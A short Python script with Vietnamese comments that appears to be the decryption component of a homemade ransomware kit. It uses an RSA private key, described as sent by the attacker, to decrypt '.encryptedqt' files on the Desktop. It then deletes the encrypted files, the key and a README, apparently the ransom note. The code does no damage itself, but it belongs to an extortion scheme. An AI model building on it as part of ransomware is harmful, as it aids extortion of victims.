import os
import smtplib
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa, padding


# mo private_key.txt sau khi da nhan duoc mail tu ben tan cong
with open('private_key.txt', 'rb') as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None,
        backend=default_backend()
    )

# Thư mục chứa các file được mã hóa
folder_path = os.path.expanduser("~/Desktop")

# Duyệt qua các file trong thư mục và giải mã chúng
for filename in os.listdir(folder_path):
    if filename.endswith(".encryptedqt"):
        input_file = os.path.join(folder_path, filename)
        output_file = os.path.join(folder_path, filename[:-12] + '.txt')  # Loại bỏ phần mở rộng EncryptedQT

        with open(input_file, 'rb') as f:
            encrypted = f.read()

        # Giải mã
        decrypted = private_key.decrypt(
            encrypted,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )

        # Ghi dữ liệu đã giải mã vào file mới
        with open(output_file, 'wb') as f:
            f.write(decrypted)

        # Xóa file đã mã hóa sau khi đã giải mã
        os.remove(input_file)

os.remove('private_key.txt')
os.remove('README.txt')